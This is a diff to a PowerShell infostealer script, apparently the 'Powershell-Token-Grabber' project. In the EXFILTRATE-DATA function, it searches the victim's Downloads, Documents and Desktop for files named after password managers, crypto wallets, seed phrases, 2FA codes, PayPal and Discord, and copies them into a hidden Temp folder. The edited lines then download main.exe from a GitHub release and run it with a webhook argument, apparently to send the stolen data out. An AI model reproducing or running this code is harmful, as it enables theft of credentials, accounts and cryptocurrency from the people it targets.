@@ -263,43 +263,43 @@ function EXFILTRATE-DATA {
 	New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
 	$filegrabber = "$env:localappdata\Temp\Files Grabber"
 	Function GrabFiles {
-    $grabber = @(
-    "account",
-    "login",
-    "metamask",
-    "crypto",
-    "code",
-    "coinbase",
-    "exodus",
-    "backupcode",
-    "token",
-    "seedphrase",
-    "private",
-    "pw",
-    "lastpass",
-    "keepassx",
-    "keepass",
-    "keepassxc",
-    "nordpass",
-    "syncthing",
-    "dashlane",
-    "bitwarden",
-    "memo",
-    "keys",
-    "secret",
-    "recovery",
-    "2fa",
-    "pass",
-    "login",
-    "backup",
-    "discord",
-    "paypal",
-    "wallet"
-    )
-    $dest = "$env:localappdata\Temp\Files Grabber"
-    $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
-    [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
-    (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
+        $grabber = @(
+            "account",
+            "login",
+            "metamask",
+            "crypto",
+            "code",
+            "coinbase",
+            "exodus",
+            "backupcode",
+            "token",
+            "seedphrase",
+            "private",
+            "pw",
+            "lastpass",
+            "keepassx",
+            "keepass",
+            "keepassxc",
+            "nordpass",
+            "syncthing",
+            "dashlane",
+            "bitwarden",
+            "memo",
+            "keys",
+            "secret",
+            "recovery",
+            "2fa",
+            "pass",
+            "login",
+            "backup",
+            "discord",
+            "paypal",
+            "wallet"
+        )
+        $dest = "$env:localappdata\Temp\Files Grabber"
+        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
+        [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
+        (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     GrabFiles
     
@@ -376,7 +376,8 @@ function EXFILTRATE-DATA {
         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
     }
     
-    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
+    #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
+    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
